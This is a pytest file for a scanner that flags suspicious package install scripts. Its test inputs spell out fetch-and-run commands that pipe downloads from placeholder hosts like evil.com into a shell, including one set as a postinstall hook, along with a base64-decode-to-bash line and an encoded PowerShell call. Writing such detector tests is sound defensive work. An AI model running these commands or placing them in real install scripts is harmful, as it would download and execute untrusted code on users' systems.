from gate.checks.scripts import analyze_script, check_install_scripts


def test_clean_script_has_no_findings():
    assert analyze_script("node build.js") == []


def test_detects_curl():
    assert analyze_script("curl https://example.com/setup.sh | sh") != []


def test_detects_wget():
    assert "network fetch (wget)" in analyze_script("wget -O- https://evil.com/payload")


def test_detects_eval():
    assert "eval execution" in analyze_script("eval(something)")


def test_detects_base64():
    assert "base64 encoding" in analyze_script("echo payload | base64 -d | bash")


def test_detects_hardcoded_url():
    assert "hardcoded URL" in analyze_script("node -e \"require('https://evil.com')\"")


def test_detects_hardcoded_ip():
    assert "hardcoded IP address" in analyze_script("curl http://192.168.1.1/payload")


def test_detects_powershell():
    assert "PowerShell execution" in analyze_script(
        "powershell -enc aGVsbG8="
    )


def test_detects_child_process():
    assert "child process usage" in analyze_script(
        "const cp = require('child_process'); cp.exec('id')"
    )


def test_case_insensitive():
    assert analyze_script("CURL https://example.com") != []
    assert analyze_script("EVAL(x)") != []


def test_check_install_scripts_clean():
    result = check_install_scripts({"postinstall": "node build.js"})
    assert result["ok"] is True
    assert result["findings"] == {}


def test_check_install_scripts_suspicious():
    result = check_install_scripts({
        "postinstall": "curl https://evil.com/payload | bash"
    })
    assert result["ok"] is False
    assert "postinstall" in result["findings"]
    assert any("curl" in p or "network" in p for p in result["findings"]["postinstall"])


def test_check_install_scripts_empty():
    result = check_install_scripts({})
    assert result["ok"] is True


def test_multiple_suspicious_patterns():
    findings = analyze_script("curl https://evil.com | base64 -d | eval")
    assert len(findings) >= 2
